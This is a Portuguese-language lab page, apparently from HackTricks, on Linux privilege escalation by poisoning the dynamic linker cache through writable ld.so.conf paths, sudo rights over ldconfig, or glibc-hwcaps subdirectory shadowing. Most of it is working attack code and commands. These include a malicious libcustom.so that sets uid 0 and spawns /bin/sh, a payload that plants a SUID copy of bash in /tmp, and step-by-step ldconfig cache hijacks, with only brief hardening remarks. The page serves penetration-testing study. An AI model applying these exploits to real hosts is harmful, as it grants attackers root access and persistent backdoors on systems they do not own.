# exemplo de exploit de privesc do ld.so

{{#include ../../banners/hacktricks-training.md}}

Esta página é um lab focado em envenenar o **cache do system linker por meio de `/etc/ld.so.conf` ou `ldconfig`**. Para injeção de bibliotecas ausentes, `RPATH`/`RUNPATH` gravável, `LD_PRELOAD` e outros abusos genéricos do linker com SUID, consulte [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Prepare o ambiente

Na seção a seguir, você encontra o código dos arquivos que usaremos para preparar o ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crie** esses arquivos na sua máquina, na mesma pasta
2. **Compile** a **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copie** `libcustom.so` para `/usr/lib` e atualize o cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilégios de root)
4. **Compile** o **executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifique o ambiente

Verifique se _libcustom.so_ está sendo **carregada** de _/usr/lib_ e se você pode **executar** o binário.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos úteis de triagem

Ao atacar um alvo real, verifique o **nome exato da biblioteca** de que o binário precisa, o que o loader está **resolvendo atualmente** e quais caminhos configurados podem ser gravados sem modificar o cache ativo.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Use `ldd` apenas em um executável **confiável**. Algumas implementações ou interpretadores ELF incomuns podem fazer com que ele execute código controlado pelo atacante; `objdump -p ./file | grep NEEDED` lista com segurança as dependências diretas. Para um alvo confiável, invocar o interpretador descoberto com `--list` mostra a resolução real.<sup>[[4]](#references)</sup>

Algumas armadilhas úteis:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` geralmente **não funciona**, porque
o redirecionamento é feito pelo seu shell atual. Em vez disso, use
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Binários **SUID/privileged** ignoram `LD_LIBRARY_PATH`/`LD_PRELOAD` no
**secure-execution mode**, mas os diretórios provenientes de `/etc/ld.so.conf` ainda fazem
parte da configuração confiável do loader, portanto essa configuração incorreta ainda pode
afetar programas privilegiados.<sup>[[1]](#references)</sup>
- `LD_DEBUG` também é ignorado no secure-execution mode, a menos que `/etc/suid-debug` exista; portanto, colete seu trace a partir de uma execução não-SUID equivalente, em vez de esperar uma saída da execução privilegiada.<sup>[[1]](#references)</sup>
- Em versões mais recentes do glibc, o dynamic loader também expõe
`--list-diagnostics`, que é útil para depurar a resolução do cache e a
seleção de subdiretórios `glibc-hwcaps` quando um hijack não se comporta como esperado.<sup>[[1]](#references)</sup>

### Restrições de cache e SONAME

`ldconfig` não armazena em cache todos os arquivos arbitrários em um diretório configurado: ele examina cabeçalhos ELF, reconhece nomes que correspondem a `lib*.so*` ou `ld-*.so*` e espera a cadeia convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Portanto, o objeto injetado deve ter a arquitetura/classe do alvo, o nome exato de `DT_NEEDED` (normalmente seu `DT_SONAME`) e quaisquer símbolos/versões que a vítima resolver.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefira uma library específica do alvo, como neste exemplo. Fazer shadowing de um SONAME comum com um objeto incompleto pode interromper todos os processos que o resolvem antes que o alvo privilegiado pretendido seja executado.<sup>[[3]](#references)</sup>

## Exploit

Neste cenário, vamos supor que **alguém tenha criado uma entrada vulnerável** dentro de um arquivo em _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso de escrita).\
**Baixe e compile** o seguinte código dentro desse caminho:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se você espera que **root** (ou outra conta privilegiada) execute o binário vulnerável posteriormente, geralmente é melhor deixar um **artefato pertencente ao root** em vez de iniciar um shell interativo. Por exemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Então, depois que a execução privilegiada ocorrer, você poderá usar `/tmp/rootbash -p`.

Agora que **criamos a biblioteca maliciosa libcustom dentro do caminho configurado incorretamente**, o cache padrão deverá ser reconstruído por uma execução privilegiada bem-sucedida de **`ldconfig`**. Uma reinicialização só ajudará quando o processo de inicialização local realmente o executar; caso contrário, aguarde uma ação do administrador ou use uma regra sudo insegura, se houver uma disponível.<sup>[[2]](#references)</sup>

Depois que isso acontecer, **verifique novamente** de onde o executável `sharedvuln` está carregando a biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como você pode ver, ele está **carregando-o de `/home/ubuntu/lib`** e, se qualquer usuário o executar, um shell será executado:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Note que neste exemplo não escalamos privilégios, mas, modificando os comandos executados e **aguardando que o root ou outro usuário privilegiado execute o binário vulnerável**, poderemos escalar privilégios.

### Shadowing moderno de `glibc-hwcaps`

Desde a glibc 2.33, o loader pode preferir bibliotecas otimizadas dentro de `glibc-hwcaps/<level>/` em **cada diretório de busca de bibliotecas**. Consequentemente, verificar apenas `/home/ubuntu/lib` é insuficiente: um subdiretório compatível e gravável, como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, pode fazer shadowing da biblioteca base depois que o `ldconfig` a indexar, enquanto outras CPUs continuam usando o objeto base. Isso também fornece um hijack seletivo por arquitetura, que pode passar despercebido quando a validação ocorre em uma CPU diferente.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
A orientação atual de hardening do glibc recomenda evitar SONAMEs duplicados, locais de busca não padrão e objetos em subdiretórios `glibc-hwcaps`. Do ponto de vista de auditoria, aplique recursivamente verificações de propriedade e permissões de escrita aos diretórios configurados e a seus componentes de caminho pai.<sup>[[3]](#references)</sup>

### Outras configurações incorretas - Mesma vulnerabilidade

No exemplo anterior, simulamos uma configuração incorreta na qual um administrador **definiu uma pasta não privilegiada dentro de um arquivo de configuração em `/etc/ld.so.conf.d/`**.\
Mas existem outras configurações incorretas que podem causar a mesma vulnerabilidade: se você tiver **permissões de escrita** em algum **arquivo de configuração** dentro de `/etc/ld.so.conf.d`, na pasta `/etc/ld.so.conf.d` ou no arquivo `/etc/ld.so.conf`, poderá configurar e explorar a mesma vulnerabilidade.

## Exploit 2

**Suponha que você tenha privilégios de sudo sobre `ldconfig`**.\
Você pode indicar ao `ldconfig` **de onde carregar os arquivos conf**, então podemos tirar proveito disso para fazer o `ldconfig` carregar pastas arbitrárias.<sup>[[2]](#references)</sup>\
Então, vamos criar os arquivos e as pastas necessários para carregar "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Agora, conforme indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
E, por fim, vamos carregar o path e verificar de onde o binário está carregando a biblioteca:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como você pode ver, tendo privilégios sudo sobre `ldconfig`, você pode explorar a mesma vulnerabilidade.** Os detalhes das opções são importantes ao avaliar uma regra sudo restrita: `-f` seleciona outra configuração, mas ainda reconstrói `/etc/ld.so.cache`; `-C` redireciona o cache para outro local; `-N` impede a reconstrução do cache; e `-X` impede as atualizações de links, mas **ainda reconstrói o cache, a menos que seja combinado com `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - página de manual do Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening do Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - página de manual do Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
